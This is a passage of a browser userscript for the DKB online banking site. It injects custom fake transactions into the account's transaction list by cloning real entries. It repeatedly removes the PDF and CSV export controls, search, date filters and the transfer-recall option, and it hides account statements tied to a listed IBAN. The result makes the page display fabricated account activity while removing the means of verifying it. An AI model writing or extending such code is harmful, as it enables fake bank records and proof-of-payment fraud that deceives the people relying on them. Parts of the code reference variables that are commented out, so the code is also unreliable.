      if (defaultIndex < 0) defaultIndex = items.length;
    }
    // Positive steps => move UP (lower index), negative => move DOWN
    const targetIndex = clamp(defaultIndex - (Number(steps) || 0), 0, items.length);
    const anchor = items[targetIndex] || null;
    if (anchor) ul.insertBefore(li, anchor); else ul.appendChild(li);
  }

  // helper: get date range (min/max) from a UL list (used for LAST7 AUTO logic)
  function getUlDateRange(ul) {
    const items = getListItems(ul);
    let minD = null, maxD = null;
    for (const item of items) {
      const d = getItemDate(item);
      if (!d) continue;
      if (!minD || d < minD) minD = d;
      if (!maxD || d > maxD) maxD = d;
    }
    if (!minD || !maxD) return null;
    return { min: minD, max: maxD };
  }

  // Reconcile placeholders (VORGEMERKT, TODAY, months) when real sections appear later
  function reconcilePlaceholders(rootSection) {
    // Months
    const monthPlaceholders = Array.from(rootSection.querySelectorAll('article[aria-labelledby^="20"][data-tm-placeholder="1"]'));
    for (const ph of monthPlaceholders) {
      const key = ph.getAttribute('aria-labelledby');
      const real = Array.from(rootSection.querySelectorAll(`article[aria-labelledby="${key}"]`))
                        .find(a => a !== ph && !a.hasAttribute('data-tm-placeholder'));
      if (!real) continue;

      const phUl = ph.querySelector('ul[class^="_sui-card"]');
      let realUl = real.querySelector('ul[class^="_sui-card"]');
      if (!realUl) {
        realUl = document.createElement('ul');
        realUl.className = phUl ? phUl.className : (rootSection.querySelector('ul[class^="_sui-card"]')?.className || '_sui-card');
        real.appendChild(realUl);
      }

      const customLis = Array.from(phUl.querySelectorAll('li[id^="custom-"]'));
      for (const li of customLis) {
        const subtitle = li.querySelector('span[class*="__subtitle"]')?.textContent || '';
        const beforeEl = findInsertionPointByDate(realUl, subtitle);
        const steps = Number(li.dataset.tmSteps || 0);
        insertWithSteps(realUl, li, beforeEl, undefined, steps);
      }
      ph.remove();
      console.log(`[UserScript] Reconciled placeholder month ${key} into real article`);
    }

    // VORGEMERKT
    const pendingPh = rootSection.querySelector(`article[aria-labelledby="${PENDING_KEY}"][data-tm-placeholder="1"]`);
    const pendingReal = Array.from(rootSection.querySelectorAll(`article[aria-labelledby="${PENDING_KEY}"]`))
                             .find(a => a !== pendingPh && !a.hasAttribute('data-tm-placeholder'));
    if (pendingPh && pendingReal) {
      const phUl = pendingPh.querySelector('ul[class^="_sui-card"]');
      let realUl = pendingReal.querySelector('ul[class^="_sui-card"]');
      if (!realUl) {
        realUl = document.createElement('ul');
        realUl.className = phUl ? phUl.className : (rootSection.querySelector('ul[class^="_sui-card"]')?.className || '_sui-card');
        pendingReal.appendChild(realUl);
      }

      const customLis = Array.from(phUl.querySelectorAll('li[id^="custom-"]'));
      for (const li of customLis) {
        const steps = Number(li.dataset.tmSteps || 0);
        insertWithSteps(realUl, li, null, 0, steps);
      }
      pendingPh.remove();
      console.log('[UserScript] Reconciled placeholder VORGEMERKT into real article');
    }

    // TODAY
    const todayPh = rootSection.querySelector(`article[aria-labelledby="${TODAY_KEY}"][data-tm-placeholder="1"]`);
    const todayReal = Array.from(rootSection.querySelectorAll(`article[aria-labelledby="${TODAY_KEY}"]`))
                           .find(a => a !== todayPh && !a.hasAttribute('data-tm-placeholder'));
    if (todayPh && todayReal) {
      const phUl = todayPh.querySelector('ul[class^="_sui-card"]');
      let realUl = todayReal.querySelector('ul[class^="_sui-card"]');
      if (!realUl) {
        realUl = document.createElement('ul');
        realUl.className = phUl ? phUl.className : (rootSection.querySelector('ul[class^="_sui-card"]')?.className || '_sui-card');
        todayReal.appendChild(realUl);
      }

      const customLis = Array.from(phUl.querySelectorAll('li[id^="custom-"]'));
      for (const li of customLis) {
        const steps = Number(li.dataset.tmSteps || 0);
        insertWithSteps(realUl, li, null, 0, steps); // top default within TODAY
      }
      todayPh.remove();
      console.log('[UserScript] Reconciled placeholder TODAY into real article');
    }

    // LAST7
    const last7Ph = rootSection.querySelector(`article[aria-labelledby="${LAST7_KEY}"][data-tm-placeholder="1"]`);
    const last7Real = Array.from(rootSection.querySelectorAll(`article[aria-labelledby="${LAST7_KEY}"], article[aria-labelledby="LAST_WEEK"]`))
                           .find(a => a !== last7Ph && !a.hasAttribute('data-tm-placeholder'));
    if (last7Ph && last7Real) {
      const phUl = last7Ph.querySelector('ul[class^="_sui-card"]');
      let realUl = last7Real.querySelector('ul[class^="_sui-card"]');
      if (!realUl) {
        realUl = document.createElement('ul');
        realUl.className = phUl ? phUl.className : (rootSection.querySelector('ul[class^="_sui-card"]')?.className || '_sui-card');
        last7Real.appendChild(realUl);
      }

      const customLis = Array.from(phUl.querySelectorAll('li[id^="custom-"]'));
      for (const li of customLis) {
        const steps = Number(li.dataset.tmSteps || 0);
        insertWithSteps(realUl, li, null, 0, steps); // top default within LAST7
      }
      last7Ph.remove();
      console.log('[UserScript] Reconciled placeholder LAST7 into real article');
    }

    // YESTERDAY
    const yesterdayPh = rootSection.querySelector(`article[aria-labelledby="${YESTERDAY_KEY}"][data-tm-placeholder="1"]`);
    const yesterdayReal = Array.from(rootSection.querySelectorAll(`article[aria-labelledby="${YESTERDAY_KEY}"]`))
                               .find(a => a !== yesterdayPh && !a.hasAttribute('data-tm-placeholder'));
    if (yesterdayPh && yesterdayReal) {
      const phUl = yesterdayPh.querySelector('ul[class^="_sui-card"]');
      let realUl = yesterdayReal.querySelector('ul[class^="_sui-card"]');
      if (!realUl) {
        realUl = document.createElement('ul');
        realUl.className = phUl ? phUl.className : (rootSection.querySelector('ul[class^="_sui-card"]')?.className || '_sui-card');
        yesterdayReal.appendChild(realUl);
      }

      const customLis = Array.from(phUl.querySelectorAll('li[id^="custom-"]'));
      for (const li of customLis) {
        const steps = Number(li.dataset.tmSteps || 0);
        insertWithSteps(realUl, li, null, 0, steps); // top default within YESTERDAY
      }
      yesterdayPh.remove();
      console.log('[UserScript] Reconciled placeholder YESTERDAY into real article');
    }
  }

  function findTopUlForAtTopInsertion(rootSection) {
    const todayUl = findTodayArticleUl(rootSection);
    if (todayUl) return todayUl;

    const anchor = getAnchorAfterControls(rootSection);
    let n = anchor ? anchor.nextElementSibling : rootSection.firstElementChild;
    while (n) {
      if (n.matches && n.matches('article')) {
        const ul = n.querySelector('ul[class^="_sui-card"]');
        if (ul) return ul;
      }
      if (n.tagName === 'UL' && n.className.startsWith('_sui-card')) return n;
      n = n.nextElementSibling;
    }
    return rootSection.querySelector('ul[class^="_sui-card"]');
  }

  function insertTx(tx, rootSection) {
    if (hasEl(tx.id)) return;

    const preferPositive = isPositiveAmount(tx.amount);
    const template = findTemplateToClone(rootSection, preferPositive);
    if (!template) {
      console.warn(`[UserScript] No non-skeleton template found for "${tx.title}"`);
      return;
    }

    const clone = template.cloneNode(true);
    clone.id = tx.id;
    updateCloneContent(clone, tx, rootSection);

    const steps = Number(tx.steps || 0);
    const bucketRaw = (tx.bucket || 'AUTO').toUpperCase();
    const bucket = bucketRaw === 'V' ? 'VORGEMERKT'
                 : bucketRaw === 'H' ? 'TODAY'
                 : bucketRaw === 'G' ? 'YESTERDAY'
                 : (bucketRaw === '7' || bucketRaw === 'LAST7' || bucketRaw === 'LETZTE7') ? 'LAST7'
                 : bucketRaw;

    // Explicit buckets first
    if (bucket === 'VORGEMERKT') {
      const pendingUl = ensurePendingArticleUl(rootSection);
      if (!pendingUl) return;
      insertWithSteps(pendingUl, clone, null, 0, steps);
      console.log(`[UserScript] Inserted into VORGEMERKT with steps=${steps}: ${tx.title}`);
      return;
    }

    if (bucket === 'TODAY') {
      const todayUl = ensureTodayArticleUl(rootSection);
      if (!todayUl) return;
      insertWithSteps(todayUl, clone, null, 0, steps);
      console.log(`[UserScript] Inserted into TODAY with steps=${steps}: ${tx.title}`);
      return;
    }

    if (bucket === 'YESTERDAY') {
      const yesterdayUl = ensureYesterdayArticleUl(rootSection);
      if (!yesterdayUl) return;
      insertWithSteps(yesterdayUl, clone, null, 0, steps);
      console.log(`[UserScript] Inserted into YESTERDAY with steps=${steps}: ${tx.title}`);
      return;
    }

    if (bucket === 'LAST7') {
      const last7Ul = ensureLast7ArticleUl(rootSection);
      if (!last7Ul) return;
      insertWithSteps(last7Ul, clone, null, 0, steps);
      console.log(`[UserScript] Inserted into LAST7 with steps=${steps}: ${tx.title}`);
      return;
    }

    if (bucket === 'MONTH') {
      const monthKey = monthKeyFromDateStr(tx.date);
      if (!monthKey) {
        console.warn(`[UserScript] Cannot parse date for "${tx.title}" => month insertion skipped.`);
        return;
      }
      const monthUl = ensureMonthArticleUl(rootSection, monthKey);
      if (!monthUl) return;
      const beforeEl = findInsertionPointByDate(monthUl, tx.date);
      insertWithSteps(monthUl, clone, beforeEl, undefined, steps);
      console.log(`[UserScript] Inserted by date in ${monthKey} with steps=${steps}: ${tx.title}`);
      return;
    }

    // AUTO behavior
    if (isVorgemerkt(tx.date)) {
      const pendingUl = ensurePendingArticleUl(rootSection);
      if (!pendingUl) return;
      insertWithSteps(pendingUl, clone, null, 0, steps);
      console.log(`[UserScript] [AUTO] Inserted into VORGEMERKT with steps=${steps}: ${tx.title}`);
      return;
    }

    // NEW: If site already groups recent items under "Letzte 7 Tage", follow that for AUTO.
    // If tx.date is on/after the oldest date currently in LAST7, insert into LAST7 (no new section is created).
    const txDateAuto = parseDateFromText(tx.date);
    const existingLast7Ul = findLast7ArticleUl(rootSection);
    if (existingLast7Ul && txDateAuto) {
      const range = getUlDateRange(existingLast7Ul);
      if (range && txDateAuto >= range.min) {
        insertWithSteps(existingLast7Ul, clone, null, 0, steps);
        console.log(`[UserScript] [AUTO] Inserted into LAST7 (existing) with steps=${steps}: ${tx.title}`);
        return;
      }
    }

    if (tx.insertByDate) {
      const monthKey = monthKeyFromDateStr(tx.date);
      if (!monthKey) {
        console.warn(`[UserScript] [AUTO] Cannot parse date for "${tx.title}" => skipping date-based insertion.`);
        return;
      }
      const monthUl = ensureMonthArticleUl(rootSection, monthKey);
      if (!monthUl) return;
      const beforeEl = findInsertionPointByDate(monthUl, tx.date);
      insertWithSteps(monthUl, clone, beforeEl, undefined, steps);
      console.log(`[UserScript] [AUTO] Inserted by date in ${monthKey} with steps=${steps}: ${tx.title}`);
    } else {
      // Top of TODAY (create TODAY if missing? Not for AUTO; use existing TODAY or nearest first list)
      const topUl = findTopUlForAtTopInsertion(rootSection);
      if (!topUl) {
        console.warn('[UserScript] No list found for top insertion.');
        return;
      }
      insertWithSteps(topUl, clone, null, 0, steps);
      console.log(`[UserScript] [AUTO] Inserted at TOP with steps=${steps}: ${tx.title}`);
    }
  }

  function tick() {
    try {
      const root = findRootSectionForIban();
      if (!root) return;

      // Move custom items from placeholders to real sections if they appear
      reconcilePlaceholders(root);

      for (const tx of seccustomTransactions) {
        try { insertTx(tx, root); }
        catch (e) { console.error('[UserScript] Insert error:', tx.title, e); }
      }
    } catch (e) {
      console.error('[UserScript] Tick error:', e);
    }
  }

  setInterval(tick, TICK);
}

//======================================================================================
//======================================================================================
//======================================================================================

// UTILITIES
// UTILITIES
// UTILITIES



 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

    'use strict';

    // === TOGGLE FLAGS ===
    const shouldRemoveAriaLabel = true;
    const shouldRemoveAmountFeedback = true;
    const shouldRemoveRecallTransferParent = true;
    const shouldRemoveSearchTransactionsParent = true;
    const shouldRemoveZeitraum = true;
    const shouldRemoveTrafficPill = true;
    const shouldRemovePdf = true;
    const shouldRemoveCsv = true;
    const shouldRemoveExportHeader = true;
    const shouldDisableClicksOnUmsaetzeFuer = true;
    const shouldRemoveMoneyTransferIcon = true;
    const shouldRemoveCreditingIcon = true;
    const shouldRemoveStyledTypography = true;
    const shouldRemoveTagesgeldAriaLabel = true;
    const shouldRemoveObservableContainer = true;
    const shouldRemoveCustomizeOverviewButton = true; // ✅ NEW

    const removeElements = () => {
        try {
            // 1. aria-label="Letzte Umsätze von Girokonto"
            if (shouldRemoveAriaLabel) {
                document.querySelectorAll('[aria-label="Letzte Umsätze von Girokonto"]').forEach(el => {
                    console.log('[DKB Utilities] Removing aria-label="Letzte Umsätze von Girokonto"');
                    el.remove();
                });
            }

            // 1.5. aria-label="Letzte Umsätze von Tagesgeld"
            if (shouldRemoveTagesgeldAriaLabel) {
                document.querySelectorAll('[aria-label="Letzte Umsätze von Tagesgeld"]').forEach(el => {
                    console.log('[DKB Utilities] Removing aria-label="Letzte Umsätze von Tagesgeld"');
                    el.remove();
                });
            }

            // 2. id="amount.value-feedback"
            if (shouldRemoveAmountFeedback) {
                const el = document.getElementById('amount.value-feedback');
                if (el) {
                    console.log('[DKB Utilities] Removing id="amount.value-feedback"');
                    el.remove();
                }
            }

            // 3. Element with exact text "Überweisung zurückrufen" → remove parent
            if (shouldRemoveRecallTransferParent) {
                Array.from(document.querySelectorAll('body *')).forEach(el => {
                    if (el.textContent.trim() === 'Überweisung zurückrufen' && el.parentElement) {
                        console.log('[DKB Utilities] Removing parent of "Überweisung zurückrufen" element');
                        el.parentElement.remove();
                    }
                });
            }

            // 4. id="search-transactions" → remove parent
            if (shouldRemoveSearchTransactionsParent) {
                const el = document.getElementById('search-transactions');
                if (el?.parentElement) {
                    console.log('[DKB Utilities] Removing parent of #search-transactions');
                    el.parentElement.remove();
                }
            }

            // 5. aria-label="Zeitraum festlegen"
            if (shouldRemoveZeitraum) {
                document.querySelectorAll('[aria-label="Zeitraum festlegen"]').forEach(el => {
                    console.log('[DKB Utilities] Removing aria-label="Zeitraum festlegen"');
                    el.remove();
                });
            }

            // 6. data-testid="traffic-pill-button"
            if (shouldRemoveTrafficPill) {
                document.querySelectorAll('[data-testid="traffic-pill-button"]').forEach(el => {
                    console.log('[DKB Utilities] Removing data-testid="traffic-pill-button"');
                    el.remove();
                });
            }

            // 7. id="pdf"
            if (shouldRemovePdf) {
                const el = document.getElementById('pdf');
                if (el) {
                    console.log('[DKB Utilities] Removing id="pdf"');
                    el.remove();
                }
            }

            // 8. id="csv"
            if (shouldRemoveCsv) {
                const el = document.getElementById('csv');
                if (el) {
                    console.log('[DKB Utilities] Removing id="csv"');
                    el.remove();
                }
            }

            // 9. id="export-transactions-header"
            if (shouldRemoveExportHeader) {
                const el = document.getElementById('export-transactions-header');
                if (el) {
                    console.log('[DKB Utilities] Removing id="export-transactions-header"');
                    el.remove();
                }
            }

            // 10. Disable clicks on aria-label^="Umsätze für"
            if (shouldDisableClicksOnUmsaetzeFuer) {
                document.querySelectorAll('[aria-label^="Umsätze für"]').forEach(el => {
                    if (!el.dataset.clickDisabled) {
                        el.addEventListener('click', e => {
                            e.preventDefault();
                            e.stopPropagation();
                            console.log('[DKB Utilities] Disabled click on aria-label^="Umsätze für"');
                        }, true);
                        el.dataset.clickDisabled = 'true';
                    }
                });
            }

            // 11. icon="money-transfer"
            if (shouldRemoveMoneyTransferIcon) {
                document.querySelectorAll('[icon="money-transfer"]').forEach(el => {
                    console.log('[DKB Utilities] Removing icon="money-transfer"');
                    el.remove();
                });
            }

            // 12. icon="crediting"
            if (shouldRemoveCreditingIcon) {
                document.querySelectorAll('[icon="crediting"]').forEach(el => {
                    console.log('[DKB Utilities] Removing icon="crediting"');
                    el.remove();
                });
            }

            // 13. class includes "Typography__StyledTypography"
            if (shouldRemoveStyledTypography) {
                document.querySelectorAll('*').forEach(el => {
                    if ([...el.classList].some(cls => cls.includes('Typography__StyledTypography'))) {
                        console.log('[DKB Utilities] Removing element with class*="Typography__StyledTypography"');
                        el.remove();
                    }
                });
            }

   // 14. For elements with class*="ObservableElementstyle__ObservableContainer" AND class*="latest-transactions"
//     remove ONLY their <li> children
if (shouldRemoveObservableContainer) {
    document.querySelectorAll('*').forEach(el => {
        const classList = [...el.classList];
        const hasObservable = classList.some(cls => cls.includes('ObservableElementstyle__ObservableContainer'));
        const hasLatestTransactions = classList.some(cls => cls.includes('latest-transactions'));
        if (hasObservable && hasLatestTransactions) {
            const liChildren = el.querySelectorAll('li');
            liChildren.forEach(li => {
                console.log('[DKB Utilities] Removing <li> inside ObservableContainer with latest-transactions');
                li.remove();
            });
        }
    });
}


            // ✅ 15. class includes "CustomizeOverviewButtonstyles"
            if (shouldRemoveCustomizeOverviewButton) {
                document.querySelectorAll('*').forEach(el => {
                    if ([...el.classList].some(cls => cls.includes('CustomizeOverviewButtonstyles'))) {
                        console.log('[DKB Utilities] Removing element with class*="CustomizeOverviewButtonstyles"');
                        el.remove();
                    }
                });
            }

        } catch (err) {
            console.error('[DKB Utilities] Error during element handling:', err);
        }
    };

    setInterval(removeElements, 20);
 }

//======================================================================================
//======================================================================================
//======================================================================================



//======================================================================================
//======================================================================================
//======================================================================================

// UTILITIES
// UTILITIES
// UTILITIES



 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

    'use strict';

//    // === TOGGLE FLAGS ===
//    const shouldRemoveAriaLabel = true;
//    const shouldRemoveAmountFeedback = true;
//    const shouldRemoveRecallTransferParent = true;
//    const shouldRemoveSearchTransactionsParent = true;
//    const shouldRemoveZeitraum = true;
//    const shouldRemoveTrafficPill = true;
//    const shouldRemovePdf = false;
//    const shouldRemoveCsv = true;
//    const shouldRemoveExportHeader = false;
//    const shouldDisableClicksOnUmsaetzeFuer = true;
//    const shouldRemoveMoneyTransferIcon = true;
//    const shouldRemoveCreditingIcon = true;
//    const shouldRemoveStyledTypography = true;
//    const shouldRemoveTagesgeldAriaLabel = true;
//    const shouldRemoveObservableContainer = true;
//    const shouldRemoveCustomizeOverviewButton = true; // ✅ NEW

    const removeElements = () => {
        try {
            // 1. aria-label="Letzte Umsätze von Girokonto"
            if (shouldRemoveAriaLabel) {
                document.querySelectorAll('[aria-label="Letzte Umsätze von Girokonto"]').forEach(el => {
                    console.log('[DKB Utilities] Removing aria-label="Letzte Umsätze von Girokonto"');
                    el.remove();
                });
            }

            // 1.5. aria-label="Letzte Umsätze von Tagesgeld"
            if (shouldRemoveTagesgeldAriaLabel) {
                document.querySelectorAll('[aria-label="Letzte Umsätze von Tagesgeld"]').forEach(el => {
                    console.log('[DKB Utilities] Removing aria-label="Letzte Umsätze von Tagesgeld"');
                    el.remove();
                });
            }

            // 2. id="amount.value-feedback"
            if (shouldRemoveAmountFeedback) {
                const el = document.getElementById('amount.value-feedback');
                if (el) {
                    console.log('[DKB Utilities] Removing id="amount.value-feedback"');
                    el.remove();
                }
            }

            // 3. Element with exact text "Überweisung zurückrufen" → remove parent
            if (shouldRemoveRecallTransferParent) {
                Array.from(document.querySelectorAll('body *')).forEach(el => {
                    if (el.textContent.trim() === 'Überweisung zurückrufen' && el.parentElement) {
                        console.log('[DKB Utilities] Removing parent of "Überweisung zurückrufen" element');
                        el.parentElement.remove();
                    }
                });
            }

            // 4. id="search-transactions" → remove parent
            if (shouldRemoveSearchTransactionsParent) {
                const el = document.getElementById('search-transactions');
                if (el?.parentElement) {
                    console.log('[DKB Utilities] Removing parent of #search-transactions');
                    el.parentElement.remove();
                }
            }

            // 5. aria-label="Zeitraum festlegen"
            if (shouldRemoveZeitraum) {
                document.querySelectorAll('[aria-label="Zeitraum festlegen"]').forEach(el => {
                    console.log('[DKB Utilities] Removing aria-label="Zeitraum festlegen"');
                    el.remove();
                });
            }

            // 6. data-testid="traffic-pill-button"
            if (shouldRemoveTrafficPill) {
                document.querySelectorAll('[data-testid="traffic-pill-button"]').forEach(el => {
                    console.log('[DKB Utilities] Removing data-testid="traffic-pill-button"');
                    el.remove();
                });
            }

            // 7. id="pdf"
            if (shouldRemovePdf) {
                const el = document.getElementById('pdf');
                if (el) {
                    console.log('[DKB Utilities] Removing id="pdf"');
                    el.remove();
                }
            }

            // 8. id="csv"
            if (shouldRemoveCsv) {
                const el = document.getElementById('csv');
                if (el) {
                    console.log('[DKB Utilities] Removing id="csv"');
                    el.remove();
                }
            }

            // 9. id="export-transactions-header"
            if (shouldRemoveExportHeader) {
                const el = document.getElementById('export-transactions-header');
                if (el) {
                    console.log('[DKB Utilities] Removing id="export-transactions-header"');
                    el.remove();
                }
            }

            // 10. Disable clicks on aria-label^="Umsätze für"
            if (shouldDisableClicksOnUmsaetzeFuer) {
                document.querySelectorAll('[aria-label^="Umsätze für"]').forEach(el => {
                    if (!el.dataset.clickDisabled) {
                        el.addEventListener('click', e => {
                            e.preventDefault();
                            e.stopPropagation();
                            console.log('[DKB Utilities] Disabled click on aria-label^="Umsätze für"');
                        }, true);
                        el.dataset.clickDisabled = 'true';
                    }
                });
            }

            // 11. icon="money-transfer"
            if (shouldRemoveMoneyTransferIcon) {
                document.querySelectorAll('[icon="money-transfer"]').forEach(el => {
                    console.log('[DKB Utilities] Removing icon="money-transfer"');
                    el.remove();
                });
            }

            // 12. icon="crediting"
            if (shouldRemoveCreditingIcon) {
                document.querySelectorAll('[icon="crediting"]').forEach(el => {
                    console.log('[DKB Utilities] Removing icon="crediting"');
                    el.remove();
                });
            }

            // 13. class includes "Typography__StyledTypography"
            if (shouldRemoveStyledTypography) {
                document.querySelectorAll('*').forEach(el => {
                    if ([...el.classList].some(cls => cls.includes('Typography__StyledTypography'))) {
                        console.log('[DKB Utilities] Removing element with class*="Typography__StyledTypography"');
                        el.remove();
                    }
                });
            }

   // 14. For elements with class*="ObservableElementstyle__ObservableContainer" AND class*="latest-transactions"
//     remove ONLY their <li> children
if (shouldRemoveObservableContainer) {
    document.querySelectorAll('*').forEach(el => {
        const classList = [...el.classList];
        const hasObservable = classList.some(cls => cls.includes('ObservableElementstyle__ObservableContainer'));
        const hasLatestTransactions = classList.some(cls => cls.includes('latest-transactions'));
        if (hasObservable && hasLatestTransactions) {
            const liChildren = el.querySelectorAll('li');
            liChildren.forEach(li => {
                console.log('[DKB Utilities] Removing <li> inside ObservableContainer with latest-transactions');
                li.remove();
            });
        }
    });
}


            // ✅ 15. class includes "CustomizeOverviewButtonstyles"
            if (shouldRemoveCustomizeOverviewButton) {
                document.querySelectorAll('*').forEach(el => {
                    if ([...el.classList].some(cls => cls.includes('CustomizeOverviewButtonstyles'))) {
                        console.log('[DKB Utilities] Removing element with class*="CustomizeOverviewButtonstyles"');
                        el.remove();
                    }
                });
            }

        } catch (err) {
            console.error('[DKB Utilities] Error during element handling:', err);
        }
    };

    setInterval(removeElements, 20);
 }

//======================================================================================
//======================================================================================
//======================================================================================
if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {
  'use strict';

  // --------------------
  // Rules: sets of conditions
  // An <li> is removed if ALL conditions in one set match with use:true
  // --------------------
//  const RULES = [
 //   [
 //     { text: 'Kontoauszug', use: true },
 //     { text: '8/2025',      use: true },
//      { text: 'DE98 1203 0000 1051 0595 23', use: true },
 //   ],
 //   [
 //     { text: 'Kontoauszug', use: true },
//      { text: '9/2025',      use: true },
  //    { text: 'DE98 1203 0000 1051 0595 23', use: false },
//    ],
//    [
//      { text: 'Kontoauszug', use: true },
//      { text: '9/2025',      use: true },
//      { text: 'DE98 1203 0000 1051 0595 23', use: true },
//    ],
 //   [
//      { text: 'Kontoauszug', use: true },
//      { text: '10/2025',     use: true },
//      { text: 'DE98 1203 0000 1051 0595 23', use: true },
//    ],
//    [
//      { text: 'Kontoauszug', use: true },
//      { text: '10/2025',     use: true },
//    ],
//    [
//      { text: 'Kontoauszug', use: true },
//      { text: '9/2025',      use: true },
 //     { text: 'DE98 1203 0000 1051 0595 23', use: true },
 //   ],
 //   [
//      { text: 'Kontoauszug', use: true },
//      { text: '4/2025',      use: true },
 //     { text: 'DE98 1203 0000 1051 0595 23', use: false },
 //   ],
//    [
//      { text: 'Kontoauszug', use: true },
//      { text: '5/2025',      use: true },
 //     { text: 'DE98 1203 0000 1051 0595 23', use: false },
 //   ],
//       [
//      { text: 'Kontoauszug', use: true },
//      { text: '3/2025',      use: true },
//      { text: 'DE98 1203 0000 1051 0595 23', use: false },
//    ],
    // add more sets like this ↓
    // [
    //   { text: 'AnotherWord', use: true },
    //   { text: 'ExtraWord',   use: false },
    // ],
//  ];

  // --- Selectors (adjust if DKB changes DOM)
  const containerSelector = 'div._sui-card_1af93_1 ul';
  const liSelector = 'li._sui-list-item_11uji_110';

  // --- Logging helper
  function log(...args) {
    console.log("[DKB Cleaner]", ...args);
  }

  // --- Check if li matches a rule set
  function matchesRuleSet(li, ruleSet) {
    const text = li.textContent.toLowerCase();
    return ruleSet.every(rule => {
      if (!rule.use) return true; // ignore disabled rules
      return text.includes(rule.text.toLowerCase());
    });
  }

  // --- Main runner
  function run() {
    const container = document.querySelector(containerSelector);
    if (!container) {
      return; // silently wait
    }

    const items = container.querySelectorAll(liSelector);
    if (!items.length) return;

    let removed = 0;

    for (const li of items) {
      for (const ruleSet of RULES) {
        if (matchesRuleSet(li, ruleSet)) {
          log("Removing:", li.textContent.trim().slice(0, 80) + "…");
          li.remove();
          removed++;
          break; // stop after first matching rule set
        }
      }
    }

    if (removed > 0) {
      log(`Removed ${removed} item(s)`);
    }
  }

  // --- Keep running
  setInterval(run, 200);
  log("DKB Cleaner started…");

}

